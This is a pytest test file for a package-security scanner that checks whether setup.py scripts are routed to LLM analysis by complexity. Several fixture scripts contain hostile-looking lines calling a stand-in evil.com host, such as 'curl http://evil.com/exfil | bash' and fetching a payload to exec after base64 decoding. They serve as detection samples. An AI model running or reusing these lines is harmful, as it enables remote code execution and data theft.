"""
Test Python analyzer LLM integration.

This test verifies that the Python analyzer correctly:
1. Detects complexity in Python scripts
2. Routes complex patterns to LLM analysis
3. Combines pattern matching and LLM results
4. Generates comprehensive security findings
"""

import os
import tempfile
import pytest
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock

from tools.python_analyzer import PythonAnalyzer
from tools.ecosystem_analyzer import SecurityFinding


class TestPythonLLMIntegration:
    """Test Python analyzer LLM integration."""
    
    def test_complexity_detection_simple_script(self):
        """Test that simple scripts have low complexity scores."""
        analyzer = PythonAnalyzer()
        
        simple_script = """
from setuptools import setup

setup(
    name='simple-package',
    version='1.0.0',
    packages=['simple_package']
)
"""
        
        complexity = analyzer._calculate_complexity_score(simple_script)
        assert complexity < 0.5, f"Simple script should have low complexity, got {complexity}"
    
    def test_complexity_detection_obfuscated_script(self):
        """Test that obfuscated scripts have high complexity scores."""
        analyzer = PythonAnalyzer()
        
        obfuscated_script = """
import base64
import os

# Obfuscated malicious code
exec(base64.b64decode('aW1wb3J0IG9z').decode())
eval(compile('os.system("curl http://evil.com")', '<string>', 'exec'))
"""
        
        complexity = analyzer._calculate_complexity_score(obfuscated_script)
        assert complexity >= 0.5, f"Obfuscated script should have high complexity, got {complexity}"
    
    def test_complexity_detection_network_operations(self):
        """Test that scripts with network operations have elevated complexity."""
        analyzer = PythonAnalyzer()
        
        network_script = """
import urllib.request
import subprocess
import base64

urllib.request.urlopen('http://example.com/data')
subprocess.run(['curl', 'http://evil.com'])
exec(base64.b64decode('test'))
eval('malicious code')
"""
        
        complexity = analyzer._calculate_complexity_score(network_script)
        assert complexity >= 0.5, f"Network script should have elevated complexity, got {complexity}"
    
    @patch('tools.cache_manager.get_cache_manager')
    @patch('config.config')
    def test_llm_analysis_called_for_complex_script(self, mock_config, mock_cache_manager):
        """Test that LLM analysis is invoked for complex scripts."""
        analyzer = PythonAnalyzer()
        
        # Setup config mock
        mock_config.OPENAI_API_KEY = "test-key"
        mock_config.OPENAI_MODEL = "gpt-4"
        
        # Setup cache mocks
        mock_cache = Mock()
        mock_cache.get_llm_analysis.return_value = None  # Cache miss
        mock_cache.generate_cache_key.return_value = "test_key"
        mock_cache.store_llm_analysis.return_value = None
        mock_cache_manager.return_value = mock_cache
        
        # Mock OpenAI response
        with patch('openai.OpenAI') as mock_openai:
            mock_client = Mock()
            mock_response = Mock()
            mock_response.choices = [Mock()]
            mock_response.choices[0].message.content = """
{
    "is_suspicious": true,
    "confidence": 0.9,
    "severity": "critical",
    "threats": ["Remote code execution", "Data exfiltration"],
    "reasoning": "Script downloads and executes remote code"
}
"""
            mock_client.chat.completions.create.return_value = mock_response
            mock_openai.return_value = mock_client
        
            # Complex malicious script
            complex_script = """
import base64
import urllib.request
import os

code = urllib.request.urlopen('http://evil.com/payload').read()
exec(base64.b64decode(code))
os.system('curl http://evil.com/exfil | bash')
"""
            
            # Create temp directory with setup.py
            with tempfile.TemporaryDirectory() as temp_dir:
                setup_py = Path(temp_dir) / "setup.py"
                setup_py.write_text(complex_script)
                
                # Analyze
                findings = analyzer.analyze_install_scripts(temp_dir)
                
                # Verify LLM was called
                assert mock_client.chat.completions.create.called, "LLM should be called for complex script"
                
                # Verify findings generated
                assert len(findings) > 0, "Should generate findings for malicious script"
                
                # Check that finding includes LLM analysis
                malicious_findings = [f for f in findings if f.finding_type == "malicious_python_script"]
                assert len(malicious_findings) > 0, "Should have malicious script finding"
                
                finding = malicious_findings[0]
                assert finding.source == "python_llm_analysis", "Finding should be from LLM analysis"
                assert finding.severity == "critical", "Should use LLM severity"
                assert finding.confidence == 0.9, "Should use LLM confidence"
    
    @patch('tools.cache_manager.get_cache_manager')
    @patch('config.config')
    def test_pattern_matching_without_llm_for_simple_patterns(self, mock_config, mock_cache_manager):
        """Test that simple pattern matches don't require LLM analysis."""
        analyzer = PythonAnalyzer()
        
        # Setup config
        mock_config.OPENAI_API_KEY = "test-key"
        
        # Setup mocks
        mock_cache = Mock()
        mock_cache.get_llm_analysis.return_value = None
        mock_cache.generate_cache_key.return_value = "test_key"
        mock_cache_manager.return_value = mock_cache
        
        # Simple script with one suspicious pattern but low complexity
        simple_suspicious = """
from setuptools import setup
import os

# Simple suspicious pattern
os.system('echo hello')

setup(name='test')
"""
        
        with tempfile.TemporaryDirectory() as temp_dir:
            setup_py = Path(temp_dir) / "setup.py"
            setup_py.write_text(simple_suspicious)
            
            findings = analyzer.analyze_install_scripts(temp_dir)
            
            # LLM might not be called for low complexity
            # But if it is called and returns not suspicious, we should still have a finding
            if len(findings) > 0:
                finding = findings[0]
                # Should have detected the pattern
                assert "os.system" in str(finding.evidence) or finding.finding_type == "malicious_python_script"
    
    @patch('tools.cache_manager.get_cache_manager')
    @patch('config.config')
    def test_llm_cache_hit_avoids_api_call(self, mock_config, mock_cache_manager):
        """Test that cached LLM results avoid API calls."""
        analyzer = PythonAnalyzer()
        
        # Setup config
        mock_config.OPENAI_API_KEY = "test-key"
        
        # Setup mocks with cached result
        mock_cache = Mock()
        cached_result = {
            "is_suspicious": True,
            "confidence": 0.85,
            "severity": "high",
            "threats": ["Cached threat"],
            "reasoning": "Cached analysis"
        }
        mock_cache.get_llm_analysis.return_value = cached_result
        mock_cache.generate_cache_key.return_value = "test_key"
        mock_cache_manager.return_value = mock_cache
        
        complex_script = """
import base64
import urllib.request
import subprocess

# Complex obfuscated script
data = urllib.request.urlopen('http://evil.com').read()
exec(base64.b64decode(data))
subprocess.call(['bash', '-c', 'malicious'])
eval(compile('test', '<string>', 'exec'))
"""
        
        with patch('openai.OpenAI') as mock_openai:
            with tempfile.TemporaryDirectory() as temp_dir:
                setup_py = Path(temp_dir) / "setup.py"
                setup_py.write_text(complex_script)
                
                findings = analyzer.analyze_install_scripts(temp_dir)
                
                # Verify OpenAI was NOT called (cache hit)
                assert not mock_openai.called, "OpenAI should not be called on cache hit"
                
                # Verify cache was checked
                assert mock_cache.get_llm_analysis.called, "Cache should be checked"
                
                # Verify findings still generated from cached result
                assert len(findings) > 0, "Should generate findings from cached result"
    
    @patch('tools.cache_manager.get_cache_manager')
    @patch('config.config')
    def test_combined_pattern_and_llm_results(self, mock_config, mock_cache_manager):
        """Test that pattern matching and LLM results are properly combined."""
        analyzer = PythonAnalyzer()
        
        # Setup config
        mock_config.OPENAI_API_KEY = "test-key"
        mock_config.OPENAI_MODEL = "gpt-4"
        
        # Setup mocks
        mock_cache = Mock()
        mock_cache.get_llm_analysis.return_value = None  # Cache miss
        mock_cache.generate_cache_key.return_value = "test_key"
        mock_cache.store_llm_analysis.return_value = None
        mock_cache_manager.return_value = mock_cache
        
        # Mock OpenAI response
        with patch('openai.OpenAI') as mock_openai:
            mock_client = Mock()
            mock_response = Mock()
            mock_response.choices = [Mock()]
            mock_response.choices[0].message.content = """
{
    "is_suspicious": true,
    "confidence": 0.95,
    "severity": "critical",
    "threats": ["Remote code execution via eval", "Network exfiltration"],
    "reasoning": "Script uses eval with base64 decoding and makes network requests"
}
"""
            mock_client.chat.completions.create.return_value = mock_response
            mock_openai.return_value = mock_client
        
            # Script with multiple suspicious patterns
            multi_pattern_script = """
import base64
import subprocess
import urllib.request

# Multiple suspicious patterns
data = urllib.request.urlopen('http://evil.com').read()
eval(base64.b64decode(data))
subprocess.call(['bash', '-c', 'curl http://evil.com/exfil'])
"""
            
            with tempfile.TemporaryDirectory() as temp_dir:
                setup_py = Path(temp_dir) / "setup.py"
                setup_py.write_text(multi_pattern_script)
                
                findings = analyzer.analyze_install_scripts(temp_dir)
                
                # Should have findings
                assert len(findings) > 0, "Should generate findings"
                
                # Find the malicious script finding
                malicious_findings = [f for f in findings if f.finding_type == "malicious_python_script"]
                assert len(malicious_findings) > 0, "Should have malicious finding"
                
                finding = malicious_findings[0]
                
                # Should mention both pattern matching and LLM analysis
                evidence_str = " ".join(finding.evidence)
                assert "LLM Analysis" in evidence_str or finding.source == "python_llm_analysis"
                
                # Should use LLM confidence and severity
                assert finding.confidence >= 0.9, "Should use high LLM confidence"
                assert finding.severity == "critical", "Should use critical severity"
    
    def test_no_llm_analysis_without_api_key(self):
        """Test that LLM analysis is skipped when API key is not configured."""
        analyzer = PythonAnalyzer()
        
        with patch('config.config') as mock_config:
            mock_config.OPENAI_API_KEY = None
            
            complex_script = """
import base64
exec(base64.b64decode('test'))
"""
            
            result = analyzer._analyze_script_with_llm(complex_script, "test-package")
            
            # Should return None when no API key
            assert result is None, "Should return None when API key not configured"
    
    def test_llm_analysis_skipped_for_short_scripts(self):
        """Test that very short scripts skip LLM analysis to save costs."""
        analyzer = PythonAnalyzer()
        
        short_script = "import os"
        
        with patch('config.config') as mock_config:
            mock_config.OPENAI_API_KEY = "test-key"
            
            result = analyzer._analyze_script_with_llm(short_script, "test-package")
            
            # Should return None for very short scripts
            assert result is None, "Should skip LLM for very short scripts"
    
    @patch('tools.cache_manager.get_cache_manager')
    @patch('config.config')
    def test_llm_analysis_graceful_failure(self, mock_config, mock_cache_manager):
        """Test that LLM analysis failures are handled gracefully."""
        analyzer = PythonAnalyzer()
        
        # Setup config
        mock_config.OPENAI_API_KEY = "test-key"
        mock_config.OPENAI_MODEL = "gpt-4"
        
        # Setup mocks
        mock_cache = Mock()
        mock_cache.get_llm_analysis.return_value = None
        mock_cache.generate_cache_key.return_value = "test_key"
        mock_cache_manager.return_value = mock_cache
        
        # Mock OpenAI to raise exception
        with patch('openai.OpenAI') as mock_openai:
            mock_openai.side_effect = Exception("API Error")
        
            complex_script = """
import base64
exec(base64.b64decode('test'))
"""
            
            with tempfile.TemporaryDirectory() as temp_dir:
                setup_py = Path(temp_dir) / "setup.py"
                setup_py.write_text(complex_script)
                
                # Should not raise exception
                findings = analyzer.analyze_install_scripts(temp_dir)
                
                # Should still generate findings from pattern matching
                # (even if LLM fails)
                assert isinstance(findings, list), "Should return list even on LLM failure"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
